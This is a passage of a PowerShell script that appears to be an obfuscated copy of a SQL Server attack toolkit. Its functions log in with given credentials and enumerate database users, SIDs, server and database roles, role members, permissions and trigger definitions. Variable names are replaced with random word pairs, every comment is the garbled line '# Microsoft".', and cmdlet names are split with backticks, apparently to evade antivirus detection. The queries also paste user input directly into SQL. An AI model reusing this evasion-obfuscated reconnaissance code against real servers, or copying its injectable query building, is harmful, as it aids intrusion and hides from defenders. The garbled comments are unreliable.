            $MournCheck = " and pm.permission_name like '$WearyIsland'"
        }
        else
        {
            $MournCheck = ''
        }

        # Microsoft".
        if($BasinEnter)
        {
            $SipWomen = " and rp.name like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }

        # Microsoft".
        if($RingSilk)
        {
            $MugBored = " and pm.class_desc like '$RingSilk'"
        }
        else
        {
            $MugBored = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$FileSheep' as [DatabaseName],
                rp.name as [PrincipalName],
                rp.type_desc as [PrincipalType],
                pm.class_desc as [PermissionType],
                pm.permission_name as [PermissionName],
                pm.state_desc as [StateDescription],
                ObjectType = CASE
                WHEN obj.type_desc IS NULL
                OR obj.type_desc = 'SYSTEM_TABLE' THEN
                pm.class_desc
                ELSE
                obj.type_desc
                END,
                [ObjectName] = Isnull(ss.name, Object_name(pm.major_id))
                FROM   $FileSheep.sys.database_principals rp
                INNER JOIN $FileSheep.sys.database_permissions pm
                ON pm.grantee_principal_id = rp.principal_id
                LEFT JOIN $FileSheep.sys.schemas ss
                ON pm.major_id = ss.schema_id
                LEFT JOIN $FileSheep.sys.objects obj
                ON pm.[major_id] = obj.[object_id] WHERE 1=1
                $MugBored
                $MournCheck
            $SipWomen"

            # Microsoft".
            if(-not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Grabbing permissions for the $FileSheep database..."
            }

            $SnakeNotice = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $GlassDrawer = $GlassDrawer + $SnakeNotice
        }
    }

    End
    {
        # Microsoft".
        $GlassDrawer
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabaseUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database user.')]
        [string]$BareFew,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server login.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $PedalPet = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $PedalPet.Columns.Add('ComputerName')
        $null = $PedalPet.Columns.Add('Instance')
        $null = $PedalPet.Columns.Add('DatabaseName')
        $null = $PedalPet.Columns.Add('DatabaseUserId')
        $null = $PedalPet.Columns.Add('DatabaseUser')
        $null = $PedalPet.Columns.Add('PrincipalSid')
        $null = $PedalPet.Columns.Add('PrincipalName')
        $null = $PedalPet.Columns.Add('PrincipalType')
        $null = $PedalPet.Columns.Add('deault_schema_name')
        $null = $PedalPet.Columns.Add('create_date')
        $null = $PedalPet.Columns.Add('is_fixed_role')

        # Microsoft".
        if($BasinEnter)
        {
            $SipWomen = " and b.name like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }

        # Microsoft".
        if($BareFew)
        {
            $MeanQuilt = " and a.name like '$BareFew'"
        }
        else
        {
            $MeanQuilt = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }


        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill  -EggsBead
        }
        else
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Grabbing database users from $FileSheep."
            }

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$FileSheep' as [DatabaseName],
                a.principal_id as [DatabaseUserId],
                a.name as [DatabaseUser],
                a.sid as [PrincipalSid],
                b.name as [PrincipalName],
                a.type_desc as [PrincipalType],
                default_schema_name,
                a.create_date,
                a.is_fixed_role
                FROM    [sys].[database_principals] a
                LEFT JOIN [sys].[server_principals] b
                ON a.sid = b.sid WHERE 1=1
                $MeanQuilt
            $SipWomen"

            # Microsoft".
            $MouthIcy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $MouthIcy |
            ForEach-Object -Process {
                # Microsoft".
                if($_.PrincipalSid.GetType() -eq [System.DBNull])
                {
                    $GrassPhobic = ''
                }
                else
                {
                    # Microsoft".
                    $WaxTease = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
                    if ($WaxTease.length -le 10)
                    {
                        $GrassPhobic = [Convert]::ToInt32($WaxTease,16)
                    }
                    else
                    {
                        $GrassPhobic = $WaxTease
                    }
                }

                # Microsoft".
                $null = $PedalPet.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.DatabaseUserId,
                    [string]$_.DatabaseUser,
                    $GrassPhobic,
                    [string]$_.PrincipalName,
                    [string]$_.PrincipalType,
                    [string]$_.default_schema_name,
                    [string]$_.create_date,
                [string]$_.is_fixed_role)
            }
        }
    }

    End
    {
        # Microsoft".
        $PedalPet
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerRole
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$PrettyPie,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$MaleTestUpset,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $WarSolid = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $WarSolid.Columns.Add('ComputerName')
        $null = $WarSolid.Columns.Add('Instance')
        $null = $WarSolid.Columns.Add('RolePrincipalId')
        $null = $WarSolid.Columns.Add('RolePrincipalSid')
        $null = $WarSolid.Columns.Add('RolePrincipalName')
        $null = $WarSolid.Columns.Add('RolePrincipalType')
        $null = $WarSolid.Columns.Add('OwnerPrincipalId')
        $null = $WarSolid.Columns.Add('OwnerPrincipalName')
        $null = $WarSolid.Columns.Add('is_disabled')
        $null = $WarSolid.Columns.Add('is_fixed_role')
        $null = $WarSolid.Columns.Add('create_date')
        $null = $WarSolid.Columns.Add('modify_Date')
        $null = $WarSolid.Columns.Add('default_database_name')

        # Microsoft".
        if ($MaleTestUpset)
        {
            $EarnTouch = " AND suser_name(owning_principal_id) like '$MaleTestUpset'"
        }
        else
        {
            $EarnTouch = ''
        }

        # Microsoft".
        if ($PrettyPie)
        {
            $SipWomen = " AND name like '$PrettyPie'"
        }
        else
        {
            $SipWomen = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "SELECT   '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            principal_id as [RolePrincipalId],
            sid as [RolePrincipalSid],
            name as [RolePrincipalName],
            type_desc as [RolePrincipalType],
            owning_principal_id as [OwnerPrincipalId],
            suser_name(owning_principal_id) as [OwnerPrincipalName],
            is_disabled,
            is_fixed_role,
            create_date,
            modify_Date,
            default_database_name
            FROM [master].[sys].[server_principals] WHERE type like 'R'
            $SipWomen
        $EarnTouch"

        # Microsoft".
        $TruckInnate = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TruckInnate |
        ForEach-Object -Process {
            # Microsoft".
            $WaxTease = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
            if ($WaxTease.length -le 10)
            {
                $GrassPhobic = [Convert]::ToInt32($WaxTease,16)
            }
            else
            {
                $GrassPhobic = $WaxTease
            }

            # Microsoft".
            $null = $WarSolid.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.RolePrincipalId,
                $GrassPhobic,
                $_.RolePrincipalName,
                [string]$_.RolePrincipalType,
                [string]$_.OwnerPrincipalId,
                [string]$_.OwnerPrincipalName,
                [string]$_.is_disabled,
                [string]$_.is_fixed_role,
                $_.create_date,
                $_.modify_Date,
            [string]$_.default_database_name)
        }
    }

    End
    {
        # Microsoft".
        $WarSolid
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerRoleMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$PrettyPie,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $RoomRough = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($PrettyPie)
        {
            $EarnTouch = " AND SUSER_NAME(role_principal_id) like '$PrettyPie'"
        }
        else
        {
            $EarnTouch = ''
        }

        # Microsoft".
        if ($BasinEnter)
        {
            $SipWomen = " AND SUSER_NAME(member_principal_id) like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],role_principal_id as [RolePrincipalId],
            SUSER_NAME(role_principal_id) as [RolePrincipalName],
            member_principal_id as [PrincipalId],
            SUSER_NAME(member_principal_id) as [PrincipalName]
            FROM sys.server_role_members WHERE 1=1
            $SipWomen
        $EarnTouch"

        # Microsoft".
        $MistChubby = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $RoomRough = $RoomRough + $MistChubby
    }

    End
    {
        # Microsoft".
        $RoomRough
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabaseRole
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$PrettyPie,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$MaleTestUpset,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $FeebleDesign = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $FeebleDesign.Columns.Add('ComputerName')
        $null = $FeebleDesign.Columns.Add('Instance')
        $null = $FeebleDesign.Columns.Add('DatabaseName')
        $null = $FeebleDesign.Columns.Add('RolePrincipalId')
        $null = $FeebleDesign.Columns.Add('RolePrincipalSid')
        $null = $FeebleDesign.Columns.Add('RolePrincipalName')
        $null = $FeebleDesign.Columns.Add('RolePrincipalType')
        $null = $FeebleDesign.Columns.Add('OwnerPrincipalId')
        $null = $FeebleDesign.Columns.Add('OwnerPrincipalName')
        $null = $FeebleDesign.Columns.Add('is_fixed_role')
        $null = $FeebleDesign.Columns.Add('create_date')
        $null = $FeebleDesign.Columns.Add('modify_Date')
        $null = $FeebleDesign.Columns.Add('default_schema_name')

        # Microsoft".
        if ($MaleTestUpset)
        {
            $EarnTouch = " AND suser_name(owning_principal_id) like '$MaleTestUpset'"
        }
        else
        {
            $EarnTouch = ''
        }

        # Microsoft".
        if ($PrettyPie)
        {
            $PoliteBoat = " AND name like '$PrettyPie'"
        }
        else
        {
            $PoliteBoat = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill -EggsBead
        }
        else
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Getting roles from the $FileSheep database."
            }

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$FileSheep' as [DatabaseName],
                principal_id as [RolePrincipalId],
                sid as [RolePrincipalSid],
                name as [RolePrincipalName],
                type_desc as [RolePrincipalType],
                owning_principal_id as [OwnerPrincipalId],
                suser_name(owning_principal_id) as [OwnerPrincipalName],
                is_fixed_role,
                create_date,
                modify_Date,
                default_schema_name
                FROM [$FileSheep].[sys].[database_principals]
                WHERE type like 'R'
                $PoliteBoat
            $EarnTouch"

            # Microsoft".
            $SwimSteam = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $SwimSteam |
            ForEach-Object -Process {
                # Microsoft".
                $WaxTease = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
                if ($WaxTease.length -le 10)
                {
                    $GrassPhobic = [Convert]::ToInt32($WaxTease,16)
                }
                else
                {
                    $GrassPhobic = $WaxTease
                }

                # Microsoft".
                $null = $FeebleDesign.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.RolePrincipalId,
                    $GrassPhobic,
                    $_.RolePrincipalName,
                    [string]$_.RolePrincipalType,
                    [string]$_.OwnerPrincipalId,
                    [string]$_.OwnerPrincipalName,
                    [string]$_.is_fixed_role,
                    $_.create_date,
                    $_.modify_Date,
                [string]$_.default_schema_name)
            }
        }
    }

    End
    {
        # Microsoft".
        $FeebleDesign
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabaseRoleMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$PrettyPie,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $HillZippy = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($BasinEnter)
        {
            $SipWomen = " AND USER_NAME(member_principal_id) like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }

        # Microsoft".
        if ($PrettyPie)
        {
            $PoliteBoat = " AND USER_NAME(role_principal_id) like '$PrettyPie'"
        }
        else
        {
            $PoliteBoat = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -EggsBead -RaggedQuill
        }
        else
        {
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -AjarInnate $AjarInnate -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Getting role members for the $FileSheep database..."
            }

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                '$FileSheep' as [DatabaseName],
                role_principal_id as [RolePrincipalId],
                USER_NAME(role_principal_id) as [RolePrincipalName],
                member_principal_id as [PrincipalId],
                USER_NAME(member_principal_id) as [PrincipalName]
                FROM [$FileSheep].[sys].[database_role_members]
                WHERE 1=1
                $PoliteBoat
            $SipWomen"

            # Microsoft".
            $CurlFail = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $HillZippy = $HillZippy + $CurlFail
        }
    }

    End
    {
        # Microsoft".
        $HillZippy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLTriggerDdl
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$StoreReturn,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TestedSin = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($StoreReturn)
        {
            $SpottyRed = " AND name like '$StoreReturn'"
        }
        else
        {
            $SpottyRed = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = " SELECT 	'$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            name as [TriggerName],
            object_id as [TriggerId],
            [TriggerType] = 'SERVER',
            type_desc as [ObjectType],
            parent_class_desc as [ObjectClass],
            OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
            create_date,
            modify_date,
            is_ms_shipped,
            is_disabled
            FROM [master].[sys].[server_triggers] WHERE 1=1
        $SpottyRed"

        # Microsoft".
        $ManHurry = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TestedSin = $TestedSin  + $ManHurry
    }

    End
    {
        # Microsoft".
        $TestedSin
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLTriggerDml
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$StoreReturn,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $FewSnails = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if ($StoreReturn)
        {
            $SpottyRed = " AND name like '$StoreReturn'"
        }
        else
        {
            $SpottyRed = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing DML triggers from the databases below:."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
